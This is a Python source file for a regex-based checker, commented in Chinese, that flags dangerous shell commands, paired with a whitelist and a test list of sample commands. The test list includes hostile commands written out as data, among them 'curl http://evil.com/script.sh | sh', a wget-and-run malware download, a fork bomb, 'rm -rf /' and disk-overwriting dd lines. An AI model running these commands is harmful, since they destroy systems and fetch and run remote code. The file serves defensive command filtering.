import re
from typing import Tuple, Optional, List


class CommandChecker:
    """ 危险命令检查器，用于检测和防止执行潜在危险的系统命令 """

    def __init__(self):
        # 危险命令模式列表
        self.dangerous_patterns = [
            # 文件删除相关
            (r'\brm\s+.*-[rf]', "删除文件命令"),
            (r'\brm\s+-[rf]', "删除文件命令"),
            (r'\bunlink\b', "删除文件命令"),
            # 系统格式化和分区操作
            (r'\bmkfs\b', "格式化文件系统命令"),
            (r'\bfdisk\b', "磁盘分区命令"),
            (r'\bparted\b', "磁盘分区命令"),
            (r'\bdd\s+.*if=.*of=', "数据复制命令，可能覆盖系统文件"),
            # 权限修改
            (r'\bchmod\s+(?:-[a-zA-Z]+\s+)*\d*7\d*7\b', "危险权限修改"),
            (r'\bchmod\s+777\b', "危险权限修改"),
            (r'\bchmod\s+\d*7\d*7\b', "危险权限修改"),
            (r'\bchown\s+.*root\b', "更改文件所有者为root"),
            # 提权相关
            (r'\bsudo\s+.*rm\b', "使用sudo执行删除命令"),
            (r'\bsu\s+-\b', "切换到root用户"),
            (r'\bsu\s+root\b', "切换到root用户"),
            # 系统服务相关
            (r'\bsystemctl\s+stop\b', "停止系统服务"),
            (r'\bsystemctl\s+disable\b', "禁用系统服务"),
            (r'\bservice\s+.*stop\b', "停止系统服务"),
            # 进程操作
            (r'\bkill\s+-9\s+1\b', "强制终止init进程"),
            (r'\bkillall\s+-9\b', "强制终止所有进程"),
            (r'\bpkill\s+-9\b', "强制终止进程"),
            (r'\bkill\s+-9\s+-\d+\b', "强制终止整个进程组"),
            # 系统关机重启
            (r'\bshutdown\b', "系统关机命令"),
            (r'\breboot\b', "系统重启命令"),
            (r'\bhalt\b', "系统停机命令"),
            (r'\bpoweroff\b', "系统断电命令"),
            # 环境变量和系统配置
            (r'\bexport\s+PATH=', "修改PATH环境变量"),
            (r'\bunset\s+PATH\b', "删除PATH环境变量"),
            (r'>>?\s*/etc/', "重定向写入系统配置文件"),
            (r'\becho\s+.*>\s*/etc/', "写入系统配置文件"),
            # 系统文件编辑
            (r'\bvi\s+/etc/', "编辑系统配置文件"),
            (r'\bnano\s+/etc/', "编辑系统配置文件"),
            (r'\bemacs\s+/etc/', "编辑系统配置文件"),
            # 历史和日志清理
            (r'\bhistory\s+-c\b', "清空命令历史"),
            (r'>\s*/dev/null\s+2>&1', "重定向所有输出到null"),
            (r'\brm\s+.*\.log\b', "删除日志文件"),
            # 安装和包管理（可能安装恶意软件）
            (r'\bapt\s+install\s+.*--force\b', "强制安装软件包"),
            (r'\byum\s+install\s+.*--assumeyes\b', "自动确认安装软件包"),
            (r'\bpip\s+install\s+.*--force\b', "强制安装Python包"),
        ]
        # 危险字符模式
        self.dangerous_chars = [
            (r';', "命令分隔符，可能执行多个命令"),
            (r'`.*`', "命令替换，可能执行隐藏命令"),
            (r'\$\(.*\)', "命令替换，可能执行隐藏命令"),
            (r'\|(?!\s*head\b|\s*tail\b|\s*grep\b|\s*sort\b|\s*uniq\b|\s*wc\b|\s*cat\b)', "管道符，可能传递敏感数据"),
            (r'&&(?!\s*echo\b)', "逻辑与操作符，可能链式执行命令"),
            (r'\|\|', "逻辑或操作符，可能条件执行命令"),
            (r'<\(', "进程替换"),
            (r'>\(', "进程替换"),
        ]
        # 允许的安全命令前缀（白名单）
        self.safe_command_prefixes = [
            'ls', 'pwd', 'whoami', 'date', 'echo', 'cat', 'head', 'tail',
            'grep', 'find', 'which', 'man', 'help', 'cd', 'mkdir', 'touch',
            'cp', 'mv', 'wc', 'sort', 'uniq', 'diff', 'tree', 'file',
            'stat', 'du', 'df', 'ps', 'top', 'history', 'env', 'printenv'
        ]

    def is_command_dangerous(self, command: str) -> Tuple[bool, Optional[str]]:
        """
        检查命令是否危险
        Args:command: 要检查的命令字符串
        Returns: Tuple[bool, Optional[str]]: (是否危险, 危险原因)
        """
        command = command.strip()
        # 空命令不危险
        if not command:
            return False, None
        # 检查危险命令模式
        for pattern, reason in self.dangerous_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                return True, f"危险命令: {reason}"
        # 检查危险字符
        for pattern, reason in self.dangerous_chars:
            if re.search(pattern, command):
                # 对于 && 的特殊处理，允许 cd 命令链
                if pattern == r'&&(?!\s*echo\b)' and command.strip().startswith('cd '):
                    continue
                return True, f"包含危险字符: {reason}"
        return False, None

    def is_command_in_whitelist(self, command: str) -> bool:
        """
        检查命令是否在安全白名单中
        Args: command: 要检查的命令字符串
        Returns: bool: 是否在白名单中
        """
        command = command.strip()
        if not command:
            return False
        # 获取命令的第一个词（命令名）
        first_word = command.split()[0]
        return first_word.lower() in self.safe_command_prefixes

    def check_command_safety(self, command: str, allow_whitelist_bypass: bool = False) -> Tuple[bool, Optional[str]]:
        """
        综合检查命令安全性
        Args:
            command: 要检查的命令字符串
            allow_whitelist_bypass: 是否允许白名单命令绕过危险检查
        Returns:
            Tuple[bool, Optional[str]]: (是否安全, 不安全的原因)
        """
        # 首先检查是否危险
        is_dangerous, danger_reason = self.is_command_dangerous(command)
        if not is_dangerous:
            return True, None
        # 如果允许白名单绕过，且命令在白名单中，则认为安全
        if allow_whitelist_bypass and self.is_command_in_whitelist(command):
            return True, None

        return False, danger_reason

    def get_safety_recommendations(self, command: str) -> List[str]:
        """
        为不安全的命令提供安全建议
        Args: command: 要检查的命令字符串
        Returns: List[str]: 安全建议列表
        """
        recommendations = []

        if 'rm' in command:
            recommendations.append("使用 'rm -i' 进行交互式删除")
            recommendations.append("在删除前使用 'ls' 确认要删除的文件")

        if 'chmod 777' in command:
            recommendations.append("避免使用 '777' 权限，考虑更安全的权限设置")
            recommendations.append("使用 'chmod 755' 或 'chmod 644' 等更安全的权限")

        if 'sudo' in command:
            recommendations.append("确认您真的需要root权限")
            recommendations.append("考虑使用更具体的权限而不是sudo")

        return recommendations


if __name__ == '__main__':
    commands = [
        # 危险简单命令
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "chmod -R 777 /",
        ":(){ :|:& };:",
        "mkfs.ext4 /dev/sda1",
        "kill -9 -1",
        "halt",
        "reboot",
        "rm -rf /boot",
        "echo \"\" > /etc/passwd",
        # 危险复杂命令
        "wget http://malicious.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware",
        "curl http://evil.com/script.sh | sh",
        "echo \"0 0 * * * root rm -rf /\" >> /etc/crontab",
        "iptables -P INPUT DROP",
        "ifconfig eth0 down",
        "dd if=/dev/random of=/dev/sda bs=1M count=1000",
        "echo \"password\" | sudo -S rm -rf --no-preserve-root /",
        "chown nobody: /etc/shadow",
        "mv /etc/passwd /etc/passwd.bak && ln -s /dev/null /etc/passwd",
        "find / -type f -name '*.conf' -exec rm -f {} \\;",
        # 安全简单命令
        "ls -l",
        "pwd",
        "echo \"Hello, world!\"",
        "date",
        "cal",
        "whoami",
        "id",
        "uname -a",
        "uptime",
        "touch test.txt",
        "mkdir test_dir",
        "cp test.txt test_dir/",
        "rm test_dir/test.txt",
        "rmdir test_dir",
        "cat /etc/passwd",
        "grep \"root\" /etc/passwd",
        "ps aux",
        "df -h",
        "free -m",
        "history",
        # 安全复杂命令
        "for i in {1..5}; do echo \"Iteration $i\"; done",
        "while true; do date; sleep 1; done",
        "if [ -f /etc/passwd ]; then echo \"passwd exists\"; fi",
        "ls -la | grep \"^d\" | wc -l",
        "find . -name \"*.txt\" -exec cat {} \\;",
        "cat /var/log/syslog | grep \"error\" | tail -5",
        "curl http://example.com | grep \"title\"",
        "ping -c 4 8.8.8.8 | tail -1",
        "echo $((100 + 200))",
        "export GREETING=\"Hello\" && echo $GREETING",
        "nohup sleep 10 &",
        "command_not_exist 2> /dev/null || echo \"command failed\"",
        "echo \"test\" | tee file.txt | wc -c",
        "tar -czf archive.tar.gz /tmp/test_dir 2> /dev/null",
        "rsync -av /source/ /destination/ --dry-run",
        "git status | grep \"modified\"",
        "python -c \"import os; print(os.getcwd())\"",
        "perl -e 'print \"Hello\\n\"'",
        "awk '{print \$1}' /etc/passwd | sort | uniq",
        "sed -i 's/old/new/g' file.txt"
    ]
    cc = CommandChecker()
    for i in commands:
        print(cc.check_command_safety(i))
